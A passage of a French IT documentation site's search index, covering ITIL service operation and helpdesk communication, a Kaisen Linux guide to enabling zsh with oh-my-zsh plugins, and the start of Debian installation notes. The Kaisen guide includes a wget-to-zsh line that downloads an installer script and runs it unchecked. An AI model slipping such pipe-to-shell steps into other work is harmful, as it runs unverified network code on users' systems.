proc\u00e9dures et des escalades communes et partag\u00e9es Avoir une langue commune (souvent l'anglais)  </p> <p></p>"},{"location":"ITIL/ITIL7/#les-outils-du-centre-de-service","title":"Les Outils du centre de service","text":"<p>L'autocommutateur t\u00e9l\u00e9phonique intelligent Serveur Vocal Interactif Couplage t\u00e9l\u00e9phonique informatique Logiciel de relation utilisateur (CRM) Int\u00e9gration avec les autres outils  </p> <ul> <li>Le CMS</li> <li>La base des erreurs connues (KEDB)</li> <li>La gestion documentaire de l'entreprise (SKMS)</li> <li>Les outils de gestion de services</li> </ul> <p>Centre de services dit en libre-service (utilisateurs autonomes)</p>"},{"location":"ITIL/ITIL7/#les-processus-de-lexploitation-des-services","title":"Les processus de l'exploitation des services","text":"<ul> <li>L'ex\u00e9cution des requ\u00eates</li> <li>Traiter les demandes de services provenant des utilisateurs</li> <li>La gestion des acc\u00e8s</li> <li>Traiter les requ\u00eates relatives \u00e0 l'acc\u00e8s, aux droits et aux privil\u00e8ges des utilisateurs</li> <li>La gestion des incidents</li> <li>Restauration au plus vite du service d\u00e9grad\u00e9 ou arr\u00eat\u00e9 dans les d\u00e9lais impartis</li> <li>La gestion des probl\u00e8mes</li> <li>Rechercher les causes et solutions \u00e0 des incidents r\u00e9currents</li> <li>La gestion des \u00e9v\u00e8nements</li> <li>Interpr\u00e9ter et g\u00e9rer tous les faits d\u00e9tectables qui arrivent sur l'infrastructure, qu'ils soient normaux ou anormaux</li> </ul>"},{"location":"ITIL/ITIL7/#lexecution-des-requetes","title":"L'ex\u00e9cution des requ\u00eates","text":"<p>Objectifs </p> <p>Fournir un canal privil\u00e9gi\u00e9 vers la DSI aux utilisateurs pour \u00e9mettre et traiter leurs demandes Fournir de l'assistance aupr\u00e8s des utilisateurs sur l'utilisation des services Approvisionner des composants standards des services suivant les demandes des utilisateurs Fournir un canal pour faire remonter les plaintes des utilisateurs vers la DSI  </p> <p>Une requ\u00eate : demande de service provenant d'un utilisateur </p> <p>Assistance Conseil Information Changement standard simple  </p> <p>Une requ\u00eate va r\u00e9aliser une action </p> <p>Limit\u00e9e dans le temps A faible risque et co\u00fbt Trait\u00e9e par une seule personne  </p> <p>Le catalogue des requ\u00eates </p> <p>Base du fonctionnement de ce processus Liste pr\u00e9cise et d\u00e9taill\u00e9e des demandes de services provenant des utilisateurs Identifie pr\u00e9cis\u00e9ment quel profil d'utilisateur a le droit de demander telle requ\u00eate Diffusion et promotion de ce catalogue aupr\u00e8s de tous les utilisateurs sont un enjeu majeur  </p>"},{"location":"ITIL/ITIL7/#la-gestion-des-acces","title":"La gestion des acc\u00e8s","text":"<p>Objectifs </p> <p>Mettre en place les proc\u00e9dures d\u00e9finies par :  </p> <ul> <li>La politique de s\u00e9curit\u00e9 de la DSI</li> <li>Les recommandations de la gestion de la disponibilit\u00e9</li> <li>Les proc\u00e9dures doivent aussi \u00eatre connues et diffus\u00e9es aupr\u00e8s de tous</li> </ul> <p>Fournir aux utilisateurs les droits et privil\u00e8ges d'un service ou d'un groupe de services  </p> <p>Les droits </p> <p>Ensemble des r\u00e8gles qui vont d\u00e9finir les types d'acc\u00e8s \u00e0 un service ou un groupe de services  </p> <p>L'identit\u00e9 </p> <p>Gestion d'une installation fiable des utilisateurs qui vont acc\u00e9der \u00e0 ce service  </p> <p>L'acc\u00e8s au service </p> <p>Est le niveau, le p\u00e9rim\u00e8tre de fonctionnalit\u00e9s ou de donn\u00e9es auquel un utilisateur peut avoir acc\u00e8s Notions de confidentialit\u00e9, gestion des mots de passe et r\u00e8gles associ\u00e9es (initialisation, validation et revalidation)  </p> <p>L'identit\u00e9 des groupes </p> <p>Cartographie des groupes de l'entreprise n\u00e9cessaire Notions de groupe de services offerts \u00e0 un utilisateur ou groupe d'utilisateurs Cartographie des services mettant en avant les familles de services en fonction des droits  </p>"},{"location":"ITIL/ITIL7/#la-gestion-des-incidents","title":"La gestion des incidents","text":"<p>Objectifs </p> <ul> <li>R\u00e9tablir le service dans un \u00e9tat normal le plus rapidement possible conform\u00e9ment au SLA</li> <li>R\u00e9tablir c'est trouver une solution, un palliatif, qui va relancer le service dans son \u00e9tat normal</li> <li>Minimiser l'impact de l'incident sur les utilisateurs (les cons\u00e9quences pour l'utilisateur)</li> <li>R\u00e9tablir le service dans les d\u00e9lais contractuels (engagement aupr\u00e8s du client)</li> <li>Ce processus ne s'occupe pas de trouver la cause de l'incident</li> </ul> <p>D\u00e9finition d'un incident </p> <ul> <li>Ne pas confondre incident, \u00e9v\u00e8nement et probl\u00e8me</li> <li>Un \u00e9v\u00e8nement est un fait d\u00e9tectable qui arrive du SI alors que l'incident est un \u00e9v\u00e8nement qui alt\u00e8re ou d\u00e9grade le service rendu</li> <li>Il survient lorsque le service est arr\u00eat\u00e9 ou quand la qualit\u00e9 du service est diminu\u00e9e</li> <li>L'incident a pour origine un \u00e9v\u00e8nement (d\u00e9tect\u00e9 ou non), mais tous les \u00e9v\u00e8nements ne cr\u00e9ent pas d'incident</li> <li>Il est d\u00e9tect\u00e9 soit par un utilisateur, des outils de supervision ou de pilotage par la gestion des \u00e9v\u00e8nements</li> </ul> <p>Codifier un incident</p> <p>C'est d\u00e9terminer la priorit\u00e9 que l'on va lui attribuer Pour cela:       - Identifier l'impact de l'incident       - Identifier l'urgence de l'incident       - Utilisation d'une matrice ou d'un r\u00e9f\u00e9rentiel applicatif D\u00e9termination du d\u00e9lai de r\u00e9tablissement  </p> <p>Toutes ces notions devront \u00eatre not\u00e9es dans les SLA pour chaque service et n\u00e9goci\u00e9es avec les clients avant la mise en exploitation du service.</p> <p>L'impact : effet de l'incident sur l'utilisation d'un service  </p> <ul> <li>Perte d'exploitation:</li> <li>Nombre d'utilisateurs bloqu\u00e9s</li> <li>Non-respect des dispositions l\u00e9gales</li> <li>Positionn\u00e9 sur une \u00e9chelle de 1 \u00e0 3 ou de 1 \u00e0 5 (1 \u00e9lev\u00e9, 3 ou 5 faible)</li> </ul> <p>L'urgence : temps dont dispose la DSI pour r\u00e9tablir le service  </p> <ul> <li>Positionn\u00e9e sur une \u00e9chelle de 1 \u00e0 3 ou de 1 \u00e0 5</li> </ul> <p></p>"},{"location":"ITIL/ITIL7/#lincident-majeur","title":"L'incident majeur","text":"<ul> <li>Fort impact sur les clients</li> <li>Hors grille de codification</li> <li>D'une priorit\u00e9 tr\u00e8s \u00e9lev\u00e9e</li> <li>Trait\u00e9 diff\u00e9remment des autres incidents</li> <li>Utilisation d'une proc\u00e9dure dite de \"crise\"</li> </ul> <p>Les escalades </p> <p></p> <p>Concepts</p> <ul> <li>P\u00e9riode de fourniture des services : d\u00e9finir un calendrier d'utilisation des services</li> <li>Arbre de r\u00e9solution</li> <li>Mod\u00e8le d'incident - Branche de l'arbre la plus souvent parcourue</li> <li>Listing de d\u00e9pannage - Check-list</li> <li>Base de connaissance : liste des incidents connus et leurs solutions</li> <li>Incident majeur : gravit\u00e9 importante pour les clients</li> <li>Crises : incident majeur \u00e0 r\u00e9soudre tout de suite. Peut donner suite \u00e0 un Post-Mortem</li> </ul> <p></p>"},{"location":"ITIL/ITIL7/#gestion-des-problemes","title":"Gestion des probl\u00e8mes","text":"<p>Objectifs </p> <ul> <li>Faire diminuer le nombre d'incidents  </li> <li>Pr\u00e9venir l'apparition de nouveaux incidents et probl\u00e8mes  </li> <li>Minimiser l'impact des incidents  </li> <li>Optimiser l'efficacit\u00e9 des \u00e9quipes supports  </li> <li>Contr\u00f4ler les probl\u00e8mes : les transformer en erreurs connues  </li> <li>G\u00e9rer les erreurs  </li> <li>La proactivit\u00e9:</li> <li>Participe \u00e0 maintenir le niveau de qualit\u00e9 de service demand\u00e9</li> <li>Prend l'iniative de la recherche de situations qui d\u00e9gradent ce niveau</li> </ul> <p>Un probl\u00e8me </p> <p>Situation dont on recherche la cause inconnue d'un ou plusieurs incidents La gestion des incidents traite en temps r\u00e9el les situations (front line) La gestion des probl\u00e8mes traite les causes de ces situations (back office) Tous les incidents ne d\u00e9clenchent pas de probl\u00e8mes On ouvre un probl\u00e8me dans le cas d'incidents r\u00e9currents ou dans un contexte d'incident majeur  </p> <p>Une erreur connue </p> <p>Probl\u00e8me dont on connait la cause et dont on a identifi\u00e9 une solution temporaire ou d\u00e9finitive La base des erreurs connues (KEBD) contient l'ensemble de ces probl\u00e8mes transform\u00e9s en erreurs connues Base mise \u00e0 disposition du centre de services sous la responsabilit\u00e9 des groupes support  </p> <p></p>"},{"location":"ITIL/ITIL7/#gestion-evenements","title":"Gestion \u00e9v\u00e8nements","text":"<p>Objectifs </p> <ul> <li>Minimiser le nombre d'incidents  </li> <li>Objectif principal:</li> <li>Plus d'efficacit\u00e9 dans la gestion des \u00e9v\u00e8nements entra\u00eene moins d'incidents</li> <li>Surveiller les \u00e9v\u00e8nements et les comprendre</li> <li>Positionner des seuils et des alarmes</li> <li>Garantir le niveau de qualit\u00e9 de service</li> <li>Anticiper les situations pouvant d\u00e9t\u00e9riorer le niveau de qualit\u00e9 de service</li> <li>Avoir une action proactive sur la gestion des \u00e9v\u00e8nements pour maintenir et garantir le niveau de qualit\u00e9 de service</li> <li>Positionner des seuils sur les composants cl\u00e9s</li> </ul> <p>D\u00e9finition d'un \u00e9v\u00e8nement </p> <p>Fait d\u00e9tectable arrivant sur le syst\u00e8me d'information ou sur la fourniture d'un service Changement d'\u00e9tat d'un ou plusieurs composants de l'infrastructure Al\u00e9atoire, observable et mesurable Des outils sont n\u00e9cessaires pour le d\u00e9tecter et le mesurer Sans outillage, pas d'\u00e9v\u00e8nements  </p> <p>4 types d'\u00e9v\u00e8nements </p> <pre><code>graph TB\n A[Normal];\n B[Exception];\n C[Avertissement];\n D[Alerte ou alarme];\n</code></pre> Type Ev\u00e8nements NormalExceptionAvertissementAlerte (Alarme) <p>Indique un fonctionnement normal dans la Baseline.  </p> <p>Ev\u00e8nement anormal survenu sur l'infrastructure Peut-\u00eatre visible par les utilisateurs sans d\u00e9grader le niveau de qualit\u00e9 de service offert Peut se transformer en incident si la situation impacte le niveau de qualit\u00e9 de service  </p> <p>Ev\u00e8nement inhabituel, un avertissement (Approche d'un seuil critique, un pic d'activit\u00e9)  </p> <p>Exception n\u00e9cessitant une intervention Pr\u00e9d\u00e9fini en avance avec positionnement d'un seuil Des consignes pr\u00e9\u00e9tablies vont permettre d'intervenir Un travail pr\u00e9liminaire sur l'identification des seuils est n\u00e9cessaire  </p> <p></p>"},{"location":"ITIL/ITIL8/","title":"Livre 5 - Am\u00e9lioration continue des services","text":"<p>Objectifs </p> <ul> <li>D\u00e9finir le r\u00f4le de l'am\u00e9lioration continue des services</li> <li>Connaitre la roue de Deming</li> </ul>"},{"location":"ITIL/ITIL8/#amelioration-continue-des-services","title":"Am\u00e9lioration continue des services","text":"<p>Objectifs </p> <ul> <li>Analyser les r\u00e9sultats des diff\u00e9rents contrats (SLA, OLA, UC)</li> <li>Identifier et mettre en oeuvre toutes les actions conduisant \u00e0 l'am\u00e9lioration des services</li> <li>Am\u00e9liorer la rentabilit\u00e9 sans diminuer la qualit\u00e9 : l'efficience</li> <li>Am\u00e9liorer la relation client</li> <li>S'assurer que les m\u00e9thodes de gestion sont efficaces</li> </ul> <p>Missions </p> <ul> <li>Analyser les \u00e9volutions et les tendances</li> <li>Conduire les enqu\u00eates de satisfaction et les audits internes</li> <li>Emettre des pr\u00e9conisations d'am\u00e9lioration</li> <li>Conduire les revues de l'am\u00e9lioration continue des services</li> </ul> <p>Les indicateurs </p> <ul> <li>Les Key Performance Indicators</li> <li>Les Critical Success Factor</li> <li>Les bases de r\u00e9f\u00e9rence</li> <li>La mesure des services</li> <li>M\u00e9triques techniques (ne pas communiquer au client)</li> <li>M\u00e9triques de processus</li> <li>M\u00e9triques de services (\u00e0 communiquer au client)</li> </ul> <p></p>"},{"location":"ITIL/ITIL9/","title":"Savoir, Savoir-faire, Savoir-\u00eatre","text":"<p>Objectifs </p> <ul> <li>D\u00e9finir le savoir, les connaissances</li> <li>D\u00e9finir le savoir-faire, les comp\u00e9tences</li> <li>D\u00e9finir le savoir-\u00eatre, les aptitudes</li> </ul>"},{"location":"ITIL/ITIL9/#quel-est-le-role-du-technicien-support","title":"Quel est le r\u00f4le du technicien support ?","text":"<p>R\u00e9gler les incidents et les probl\u00e8mes rencontr\u00e9s par les utilisateurs Diagnostiquer un incident Effectuer une r\u00e9paration mat\u00e9rielle Proposer une solution de contournement  </p> <p>Commander et changer des mat\u00e9riels d\u00e9fectueux Installer du nouveau mat\u00e9riel (int\u00e9grer et g\u00e9rer un r\u00e9seau) Surveiller la s\u00e9curit\u00e9  </p> <p>Former les utilisateurs  </p>"},{"location":"ITIL/ITIL9/#quelles-sont-les-competences-requises","title":"Quelles sont les comp\u00e9tences requises ?","text":"<ul> <li>Le savoir - connaissance</li> <li>D\u00e9f. Facult\u00e9 mentale produisant une assimilation par l'esprit d'un contenu objectif pr\u00e9alablement traduit en signes et en id\u00e9es.</li> <li>Le savoir-faire - comp\u00e9tence</li> <li>D\u00e9f. Comp\u00e9tence acquise par l'exp\u00e9rience dans les probl\u00e8mes pratiques, dans l'exercice d'un m\u00e9tier.</li> <li>Le savoir-\u00eatre - aptitude</li> <li>D\u00e9f. Correspond \u00e0 la capacit\u00e9 de produire des actions et des r\u00e9actions adapt\u00e9s \u00e0 l'environnement humain et \u00e9cologique.</li> </ul>"},{"location":"ITIL/ITIL9/#competences-et-profils","title":"Comp\u00e9tences et profils","text":"<ul> <li>Comp\u00e9tences professionnelles</li> <li>Connaissances syst\u00e8me</li> <li>Connaissances r\u00e9seau</li> <li>Connaissances de l'ERP et du m\u00e9tier du client (workflow)</li> <li>Profils</li> <li>Sens de l'\u00e9coute</li> <li>Calme</li> <li>Qualit\u00e9s relationnelles</li> <li>Efficacit\u00e9</li> <li>Organisation</li> <li>Veille technologique</li> </ul>"},{"location":"ITIL/ITIL9/#savoirs-connaissances","title":"Savoirs - Connaissances","text":"<p>Vous \u00eates vous d\u00e9j\u00e0 dit ?  - \"J'ai d\u00e9j\u00e0 eu ce probl\u00e8me, mais je ne sais plus comment j'ai fait pour le r\u00e9gler\"</p> <p>Il faut une bonne base de connaissance - Wiki - Logiciel interne - Site intranet - Logiciel de gestion de parc (GLPI)</p> <p>Il faut une bonne veille technologique  </p> <p>Documentez les bonnes pratiques Partagez les solutions pour les incidents communs Permettez aux utilisateurs finaux de r\u00e9soudre par eux-m\u00eames leurs incidents Facilitez les recherches en rendant visible les articles qu'aux personnes n\u00e9cessaires Partagez vis id\u00e9es, vos exp\u00e9riences, votre veille technologique  </p>"},{"location":"ITIL/ITIL9/#avantages","title":"Avantages","text":"<ul> <li>Solutions pour les utilisateurs finaux 24/7 par un navigateur web</li> <li>R\u00e9duit la charge de travail du service helpdesk</li> <li>Am\u00e9liore la productivit\u00e9 g\u00e9n\u00e9rale et donc l'efficience</li> <li>Facilit\u00e9 d'utilisation et de partage</li> <li>R\u00e9duction des temps de r\u00e9solution qui permet de respecter les SLA</li> </ul>"},{"location":"ITIL/ITIL9/#savoir-faire-competences","title":"Savoir-Faire - Comp\u00e9tences","text":""},{"location":"ITIL/ITIL9/#la-competence","title":"La comp\u00e9tence","text":"<p>La comp\u00e9tence d\u00e9signe la mobilisation d'un ensemble de ressources en vue de r\u00e9soudre une situation complexe  </p>"},{"location":"ITIL/ITIL9/#la-communication","title":"La communication","text":"<p>Entre ce que je pense, Ce que je veux dire, Ce que je dois dire, Ce que je dis r\u00e9ellement, Ce que vous voulez entendre, Ce que vous entendez, Ce que vous croyez comprendre, Et ce que vous comprenez r\u00e9ellement, Il y a au moins 10 possibilit\u00e9s De ne pas se comprendre Mais essayons quand m\u00eame.  </p> <p>Bernard WERBER</p>"},{"location":"ITIL/ITIL9/#la-communication-externe","title":"La communication externe","text":"<p>La communication externe tente de r\u00e9pondre \u00e0 l'un des objectifs suivants :  - Faire passer une information, une connaissance ou une \u00e9motion - Cr\u00e9er un langage commun pour faciliter la compr\u00e9hension (ITIL) - Cr\u00e9er une relation pour \u00eatre connu et ainsi fid\u00e9lis\u00e9 - Cr\u00e9er une influence pour inciter l'autre</p>"},{"location":"ITIL/ITIL9/#la-communication-interne","title":"La communication interne","text":"<p>La communication interne permet - Implication - Adaptation au changement - Bonne ambiance - Disparition des rumeurs</p>"},{"location":"ITIL/ITIL9/#le-verbal","title":"Le verbal","text":"<p>L'\u00e9mission des signaux ne signifie pas forc\u00e9ment leur bonne r\u00e9ception par le(s) r\u00e9cepteur(s) Une bonne communication n\u00e9cessite la r\u00e9ception et la compr\u00e9hension de l'information par le(s) destinataire(s) Vous \u00eates tour \u00e0 tour \u00e9metteur et r\u00e9cepteur - Emetteur: soyez clai, pr\u00e9cis et compr\u00e9hensible - R\u00e9cepteur: soyez disponible et sachez \u00e9couter (donc, vous taire)</p>"},{"location":"ITIL/ITIL9/#le-non-verbal","title":"Le non-verbal","text":"<ul> <li>Gestes naturels: mouvements d'instinct ou r\u00e9flexes (haussement d'\u00e9paules)</li> <li>Gestes sociaux: mouvements volontaires, li\u00e9s \u00e0 la culture, \u00e0 l'origine sociale</li> <li>Regard: sa direction est une indication du degr\u00e9 d'int\u00e9r\u00eat port\u00e9 \u00e0 l'autre</li> <li>Expression du visage: disponibilit\u00e9 d'esprit, degr\u00e9 de sympathie</li> <li>Posture et mouvement: degr\u00e9 d'assurance, de disponibilit\u00e9</li> <li>V\u00eatements: statut social, style de vie, mais aussi mise en valeur de l'autre...</li> </ul>"},{"location":"ITIL/ITIL9/#la-technique","title":"La technique","text":"<p>Questionnement -d\u00e9couverte des besoins Ecoute - analyse des besoins Reformulation - finalisation et obtention de oui  </p>"},{"location":"ITIL/ITIL9/#questionnement","title":"Questionnement","text":"<ul> <li>Questionnement ouvert: favorise la g\u00e9n\u00e9ralisation</li> <li>En quoi est-ce important ?</li> <li>Quel est votre avis ?</li> <li>Qu'est-ce que cela repr\u00e9sente pour vous ?</li> <li>Questionnement ferm\u00e9: favorise la sp\u00e9cification</li> <li>Quand ?</li> <li>Combien de fois ?</li> <li>Avec qui ?</li> <li>Etes-vous d'accord ?</li> </ul>"},{"location":"ITIL/ITIL9/#lecoute","title":"L'Ecoute","text":"<ul> <li>Etre ouvert \u00e0 l'autre  </li> <li>Lire entre les lignes du discours  </li> <li>Percevori l'environnement  </li> <li>Ecouter le message  </li> <li>Objectifs  </li> <li>Obtenir de l'information</li> <li>Rester ouvert aux perceptions de l'autre</li> <li>Comprendre le degr\u00e9 de motivation</li> </ul>"},{"location":"ITIL/ITIL9/#la-reformulation","title":"La reformulation","text":"<ul> <li>Redire avec d'autres mots ce que votre client vient d'exprimer</li> <li>Objectifs</li> <li>Montrer que l'on a \u00e9cout\u00e9</li> <li>V\u00e9rifier que l'on a compris</li> <li>Eventuellement, faire pr\u00e9ciser votre client</li> <li>Exemples</li> <li>Ainsi selon vous ...</li> <li>Si j'ai bien compris ...</li> <li>Vous voulez dire ...</li> <li>En somme, vous trouvez que ...</li> </ul> <p>3 m\u00e9thodes de reformulation :</p> <ul> <li>De reflet</li> <li>De r\u00e9sum\u00e9</li> <li>De clarification</li> </ul> <p>La reformulation permet de :</p> <ul> <li>Mettre en confiance</li> <li>Relancer le d\u00e9bat</li> <li>Clarifier le d\u00e9bat</li> <li>Mettre en mot le ressenti</li> </ul>"},{"location":"ITIL/ITIL9/#la-communication-ecrite","title":"La communication \u00e9crite","text":"<p>Communication \u00e9crite : Permet de v\u00e9hiculer l'image de son auteur L'\u00e9crit est indispensable dans la vie professionnelle On adapte son \u00e9crit en fonction de son interlocuteur - Choix du vocabulaire - Texte concis - Document de synth\u00e8se pour les d\u00e9cideurs</p> <p>Les mots </p> <p>Pr\u00e9f\u00e9rez les mot courts Evitez les mots savants et pompeux N'imposez pas votre jargon Employez des mots concrets Evitez le franglais M\u00e9fiez-vous des sigles Employez des verbes pr\u00e9cis  </p> <p>Les phrases </p> <p>Pensez au vocabulaire clair et pr\u00e9cis Evitez de faire du Proust Accompagnez les sch\u00e9mas et les explications : legendez ! Privil\u00e9giez les phrases courtes dans un rapport N'oubliez pas les introductions de chapitre  </p> <p>La ponctuation </p> <p>La ponctuation comme une respiration La ponctuation des listes : \u00e9num\u00e9ration de substantifs ou de phrases Respectez les r\u00e8gles de typographie  </p> <p>Les paragraphes </p> <p>Pensez \u00e0 laisser des espaces Jouez avec Word poru la justification Travaillez en mode tableau ou colonne pour mettre en valeur des arguments Faites un peu de mise en page !  </p> <p>Le texte </p> <p>Revenez \u00e0 l'objectif Demandez les consignes Respectez les r\u00e8gles Choisissez la maquette en fonction de la cible Relisez-vous trois fois ! Faites relire pour l'orthographe  </p> <p>Utiliser la messagerie </p> <p>Une communication rapide, instantan\u00e9e Ecrite Asynchrone Vers un ou plusieurs interlocuteurs Dot\u00e9e de m\u00e9moire externe Synth\u00e9tique, percutante Permet l'echange  </p> <p>Probl\u00e8mes pos\u00e9s par la messagerie </p> <p>Stress Surcharge Urgence Interruption D\u00e9personnalisation de la relation Aplatissement des structures hi\u00e9rarchiques A ne pas confondre avec le tchat Mauvaise interpr\u00e9tation Attention \u00e0 la gestion de la confidentialit\u00e9  </p>"},{"location":"ITIL/ITIL9/#savoir-etre-aptitudes","title":"Savoir-\u00eatre - Aptitudes","text":""},{"location":"ITIL/ITIL9/#les-aptitudes","title":"Les aptitudes","text":"<ul> <li>Sang froid</li> <li>Disponibilit\u00e9</li> <li>Rapidit\u00e9 d'adaptation</li> <li>Facilit\u00e9 de parole</li> <li>Rapidit\u00e9 d'analyse</li> <li>Ecoute</li> </ul>"},{"location":"ITIL/ITIL9/#gestion-des-conflits","title":"Gestion des conflits","text":""},{"location":"ITIL/ITIL9/#client-agressif","title":"Client agressif:","text":"<p>Client 1:  </p> <ul> <li>De mauvaise foi</li> <li>Ne reconnaissant surtout pas son erreur</li> <li>Suffisant</li> <li> <p>D\u00e9sagr\u00e9able</p> </li> <li> <p>Ne pas insister, il ne s'agit pas d'avoir le dernier mot</p> </li> <li>Si cela lui fait plaisir, lui laisser croire \u00e0 sa sup\u00e9riorit\u00e9</li> </ul> <p>Client 2:  </p> <ul> <li> <p>Col\u00e9rique</p> </li> <li> <p>Ne pas le laisser aller trop loin, il faut aussi se faire respecter</p> </li> <li>Ne pas entrer dans son jeu en se mettant en col\u00e8re aussi</li> <li>Garder son calme pour d\u00e9samorcer le conflit, \u00e0 s'\u00e9nerver tout seul, il finira par se sentir ridicule</li> </ul>"},{"location":"ITIL/ITIL9/#client-stresse","title":"Client stress\u00e9","text":"<ul> <li>Evaluer le niveau du blocage</li> <li>Blocage partiel</li> <li> <p>Blocage total</p> </li> <li> <p>Rassurer l'utilisateur et montrer que:</p> </li> <li>Vous prenez les choses en main</li> <li>Vous prenez en compte son urgence</li> </ul>"},{"location":"ITIL/ITIL9/#client-malhabile","title":"Client malhabile","text":"<ul> <li>D\u00e9butant sur son logiciel</li> <li>Se mettre \u00e0 sa place</li> <li>Le d\u00e9culpabiliser</li> <li>R\u00e9fractaire \u00e0 l'informatique</li> <li>Jouer la complicit\u00e9 avec humour</li> <li>L'encourager \u00e0 pers\u00e9v\u00e9rer si possible</li> </ul>"},{"location":"ITIL/ITIL9/#phrases-a-proscrire","title":"Phrases \u00e0 proscrire","text":"<p>Ne pas dire : \"Je ne sais pas\"  </p> <p>Dire : \"Je vais me renseigner\" \"Votre probl\u00e8me est relativement complexe\" \"Fixer un d\u00e9lai\"  </p> <p>Ne pas dire : \"Je ne comprends pas ce qu'il se passe\"  </p> <p>Dire : \"Il y a s\u00fbrement une explication\"  </p> <p>Ne pas dire : \"Vous avez commis une erreur\"  </p> <p>Dire : \"Ce programme est complexe \u00e0 utiliser\" Cela permet de le d\u00e9culpabiliser sans remettre en cause la qualit\u00e9 du logiciel.  </p> <p>Ne pas dire : \"On m'a r\u00e9pondu ...\" \"Un coll\u00e8gue m'a dit...\"  </p> <p>Dire : \"J'ai trouv\u00e9 la solution\"  </p> <p>Ne pas dire : \"Ce logiciel est nul\"  </p> <p>Mais plut\u00f4t : Ne pas d\u00e9courager l'utilisateur / le client, mais plut\u00f4t le stimuler en lui laissant entrevoir toutes les capacit\u00e9s du logiciel une fois qu'il le ma\u00eetrisera  </p> <p>Ne pas dire : \"Je ne comprends pas ce que vous d\u00eetes\"  </p> <p>Mais essayez, plut\u00f4t, de reformuler ce que le client a pu vous dire Si ce n'est pas possible :  </p> <ul> <li>Lui laisser entendre que son probl\u00e8me n'est pas simple</li> <li>Eviter les questions trop larges</li> <li>Essayer de d\u00e9finir avec lui le probl\u00e8me \u00e9tape par \u00e9tape en reformulant ce que vous avez compris \u00e0 chaque \u00e9tape de son explication</li> </ul>"},{"location":"Kaisen/modification_terminal/","title":"Modification du terminal Kaisen en Terminal Kali","text":"<p>Cette fiche permet d'activer l'autosuggestion ainsi que la coloration syntaxique kali sur un terminal kaisen  </p>"},{"location":"Kaisen/modification_terminal/#utilisez-zsh-pour-un-simple-utilisateur","title":"Utilisez ZSH pour un simple utilisateur","text":"<p>Le terminal par d\u00e9faut de Kaisen Linux est Bash. Bash convient \u00e0 la majorit\u00e9 des utilisateurs et c'est pour cette raison qu'il est devenu le terminal par d\u00e9faut depuis Kaisen 2.1. Vous n'\u00eates qu'un utilisateur et vous n'avez qu'un seul compte install\u00e9, utilisez la commande suivante ( comme utilisateur et non comme root ):  </p> <p><pre><code>chsh -s /bin/zsh\n</code></pre> la prochaine fois que vous vous reconnecterez \u00e0 votre session, ZSH sera activ\u00e9.  </p>"},{"location":"Kaisen/modification_terminal/#utilisez-zsh-pour-plusieurs-utilisateurs","title":"Utilisez ZSH pour plusieurs utilisateurs","text":""},{"location":"Kaisen/modification_terminal/#useradd","title":"<code>useradd</code>","text":"<p>A l'ajout d'un utilisateur la commande <code>useradd</code> permettra de lui donner le shell zsh par d\u00e9faut :  </p> <pre><code>sudo useradd -s /bin/zsh [user]\n</code></pre>"},{"location":"Kaisen/modification_terminal/#modifier-la-configuration-de-lutilisateur-ajoute","title":"Modifier la configuration de l'utilisateur ajout\u00e9","text":"<p>Dans le fichier <code>/etc/default/useradd</code> modifiez la ligne suivante :  </p> <p><pre><code>SHELL=/bin/bash\n</code></pre> en <pre><code>SHELL=/bin/zsh\n</code></pre> Apr\u00e8s cela, avec la commande <code>useradd</code>, le shell bash sera d\u00e9fini par d\u00e9faut et l'option <code>-s</code> n'aura plus besoin d'\u00eatre sp\u00e9cifi\u00e9.  </p>"},{"location":"Kaisen/modification_terminal/#adduser","title":"<code>adduser</code>","text":"<p>A l'ajout d'un utilisateur, via la commande <code>adduser</code>, la commande suivante permettra de lui donner le shell par d\u00e9faut :  </p> <pre><code>sudo adduser --shell /bin/zsh [user]\n</code></pre>"},{"location":"Kaisen/modification_terminal/#modifier-la-configuration-de-lutilisateur-ajoute_1","title":"Modifier la configuration de l'utilisateur ajout\u00e9","text":"<p><pre><code>DSHELL=/bin/bash\n</code></pre> en <pre><code>DSHELL=/bin/zsh\n</code></pre> Apr\u00e8s cela, avec la commande <code>adduser</code>, le shell bash sera d\u00e9fini par d\u00e9faut et l'option <code>-s</code> n'aura plus besoin d'\u00eatre sp\u00e9cifi\u00e9.  </p>"},{"location":"Kaisen/modification_terminal/#activation-de-lautosuggestion-et-de-la-coloration-syntaxique-kali","title":"Activation de l'autosuggestion et de la coloration syntaxique KALI","text":"<p>Afin de passer de ce style de terminal :</p> Terminal Kaisen BasiqueTerminal style KALI <p> </p> <p> </p> <p>Nous devons dans un premier temps r\u00e9cuperer les plugins sur des d\u00e9pot github. Pour cela :  </p> <p><pre><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh\ncp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc\nsource ~/.zshrc     # Permet de relancer le shell\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n</code></pre> Ensuite il faut activer les 2 plugins dans le fichier <code>.zshrc</code> Pour cela il faut ouvrir le fichier <code>$ ~/.zshrc</code> et modifier la ligne :  </p> <p>plugins</p> Fichier de base <pre><code>plugins=(git)\n</code></pre> Fichier modifi\u00e9 <pre><code>plugins=(git\nzsh-autosuggestions\nzsh-syntax-highlighting\n)\n</code></pre> <p>puis lancer la commande : <pre><code>source ~/.zshrc\n</code></pre></p>"},{"location":"Linux/Administration_Debian/","title":"Administration Debian","text":"<p>Objectifs\u00a0: D\u00e9couvrir les diff\u00e9rents modes d\u2019installation possibles Apprendre \u00e0 effectuer des installations de Debian GNU/Linux.  </p>"},{"location":"Linux/Administration_Debian/#les-modes-dinstallation","title":"Les modes d\u2019installation","text":"<p>Les diff\u00e9rents supports d\u2019installation permettant d\u2019installer Debian sont les suivants\u00a0:  </p> <p>Les CD-ROM ou DVD-ROM</p> <ul> <li>Live-CD Debian</li> <li>Un syst\u00e8me directement fonctionnel depuis le DVD afin de tester si les composants sont fonctionnels et compatibles.</li> <li>Permets de tester sans apporter la moindre modification sur la machine et le syst\u00e8me d\u2019exploitation d\u00e9j\u00e0 pr\u00e9sent.</li> <li>Debian se chargera depuis le cd-rom sur la m\u00e9moire vive de l\u2019ordinateur</li> <li>Propose l\u2019installation.</li> <li>Plusieurs versions disponibles selon le bureau choisi<ul> <li>GNOME</li> <li>KDE</li> <li>LXDE</li> <li>XFCE</li> </ul> </li> <li>Architecture I386 et AMD 64</li> <li>DVD-ROM image compl\u00e8te</li> <li>Permets l\u2019installation du syst\u00e8me complet sans acc\u00e8s \u00e0 internet ou \u00e0 un 